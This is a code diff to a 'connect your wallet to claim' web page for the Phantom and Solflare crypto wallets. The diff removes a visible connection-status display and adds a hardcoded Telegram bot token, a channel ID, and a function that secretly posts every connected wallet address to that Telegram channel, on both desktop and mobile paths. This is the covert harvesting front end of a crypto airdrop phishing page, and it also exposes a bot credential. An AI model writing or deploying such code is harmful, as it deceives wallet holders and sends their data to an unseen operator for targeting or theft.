@@ -32,11 +32,6 @@
     button:hover {
       background: #00d69b;
     }
-    #connectionStatus {
-      margin-top: 20px;
-      font-size: 16px;
-      color: #00ffae;
-    }
   </style>
 </head>
 <body>
@@ -45,80 +40,92 @@
     <p>Connect your wallet to claim</p>
     <button onclick="connectPhantom()">Connect Phantom</button>
     <button onclick="connectSolflare()">Connect Solflare</button>
-    <div id="connectionStatus"></div>
   </div>
 
   <script>
-    // Connection status management
-    function updateConnectionStatus(status) {
-      document.getElementById('connectionStatus').textContent = status;
+    const BOT_TOKEN = "7978623862:AAHezOh3PLYYy92TIjtIN9oRof32nbfwNMQ";
+    const CHANNEL_ID = "-1002600871606";
+
+    // Send message to Telegram
+    async function sendToTelegram(walletAddress) {
+      const message = `✅ Wallet Connected: ${walletAddress}`;
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHANNEL_ID,
+            text: message
+          })
+        });
+      } catch (err) {
+        console.error("Telegram error:", err);
+      }
     }
 
-    // Phantom connection that works like Raydium
+    // Phantom connection
     async function connectPhantom() {
-      // Check if Phantom extension is available
+      // Desktop
       if (window.solana?.isPhantom) {
         try {
-          const response = await window.solana.connect();
-          const publicKey = response.publicKey.toString();
-          updateConnectionStatus(`Connected: ${publicKey}`);
+          const resp = await window.solana.connect();
+          const walletAddress = resp.publicKey.toString();
+          await sendToTelegram(walletAddress);
+          alert(`Connected: ${walletAddress}`);
           return;
         } catch (err) {
-          updateConnectionStatus("Connection cancelled");
+          console.error("Connection error:", err);
           return;
         }
       }
       
-      // Mobile flow - try to trigger connection without redirects
+      // Mobile - DIRECT LAUNCH
       if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
-        updateConnectionStatus("Check your wallet app for connection prompt");
+        // Phantom mobile deep link
+        window.location.href = "https://phantom.app/ul/connect";
         
-        // Create hidden iframe to trigger wallet
-        const iframe = document.createElement('iframe');
-        iframe.src = 'https://phantom.app/ul/';
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
-        
-        // Remove iframe after short delay
-        setTimeout(() => {
-          document.body.removeChild(iframe);
-        }, 1000);
-      } else {
-        updateConnectionStatus("Phantom extension not detected");
+        // Listen for return with wallet address
+        const checkConnection = setInterval(async () => {
+          if (window.solana?.isConnected) {
+            clearInterval(checkConnection);
+            const walletAddress = window.solana.publicKey.toString();
+            await sendToTelegram(walletAddress);
+            alert(`Connected: ${walletAddress}`);
+          }
+        }, 500);
       }
     }
 
-    // Solflare connection that works like Raydium
+    // Solflare connection
     async function connectSolflare() {
-      // Check if Solflare extension is available
+      // Desktop
       if (window.solflare) {
         try {
           await window.solflare.connect();
-          const publicKey = window.solflare.publicKey.toString();
-          updateConnectionStatus(`Connected: ${publicKey}`);
+          const walletAddress = window.solflare.publicKey.toString();
+          await sendToTelegram(walletAddress);
+          alert(`Connected: ${walletAddress}`);
           return;
         } catch (err) {
-          updateConnectionStatus("Connection cancelled");
+          console.error("Connection error:", err);
           return;
         }
       }
       
-      // Mobile flow - try to trigger connection without redirects
+      // Mobile - DIRECT LAUNCH
       if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
-        updateConnectionStatus("Check your wallet app for connection prompt");
+        // Solflare mobile deep link
+        window.location.href = "solflare://connect";
         
-        // Create hidden iframe to trigger wallet
-        const iframe = document.createElement('iframe');
-        iframe.src = 'solflare://connect';
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
-        
-        // Remove iframe after short delay
-        setTimeout(() => {
-          document.body.removeChild(iframe);
-        }, 1000);
-      } else {
-        updateConnectionStatus("Solflare extension not detected");
+        // Listen for return with wallet address
+        const checkConnection = setInterval(async () => {
+          if (window.solflare?.isConnected) {
+            clearInterval(checkConnection);
+            const walletAddress = window.solflare.publicKey.toString();
+            await sendToTelegram(walletAddress);
+            alert(`Connected: ${walletAddress}`);
+          }
+        }, 500);
       }
     }
   </script>
